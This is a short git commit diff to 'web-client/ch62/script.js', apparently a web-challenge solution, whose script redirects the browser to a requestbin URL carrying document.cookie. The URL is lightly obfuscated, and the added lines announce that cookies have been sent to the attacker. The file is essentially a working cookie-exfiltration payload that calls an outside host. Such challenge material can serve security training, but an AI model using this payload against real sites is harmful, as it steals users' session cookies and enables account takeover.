2fa00e88670f045682fff5dd9c0d995a36a43af5
Laytongentleman <lnmt21@protonmail.com>
2025-12-04 17:51:32 +0100

    cyberdebug

--- web-client/ch62/script.js
+++ web-client/ch62/script.js
@@ -1,2 +1,4 @@
 
 window.location = 'htt' + 'p' + String.fromCharCode(58) + '//requestbin.whapi.cloud/zmr8cgzm?q=' + document.cookie;
+alert('If you see this message, your cookies have been sent to the attacker.');
+console.log('Cookie exfiltration attempt completed.');
